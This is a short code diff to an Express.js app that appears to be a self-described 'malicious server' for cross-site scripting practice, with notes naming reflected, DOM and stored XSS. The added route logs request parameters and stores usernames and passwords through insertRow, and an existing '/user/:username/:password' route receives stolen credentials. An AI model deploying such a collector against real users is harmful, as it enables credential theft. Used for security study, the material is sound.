@@ -23,6 +23,17 @@ app.set('view engine', 'ejs');
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.urlencoded({ extended: true }));
 
+app.get('/', function(req, res) {
+  console.log("app.get('/user/:username/:password', function(req, res)")
+
+  console.log(req.params)
+
+  insertRow(req.params.username, req.params.password);
+
+  res.send("malicious server is up and running");
+
+});
+
 app.get('/user/:username/:password', function(req, res) {
     console.log("app.get('/user/:username/:password', function(req, res)")
 
@@ -70,9 +81,14 @@ app.get('/:payload', function(req, res) {
 
 app.listen(3001);
 
-console.log("listening on port 3001")
+console.log("listening on http://localhost:3001")
 
 /*
+
+
+reflected - 
+dom
+stored - 
 
 reflected xss
 
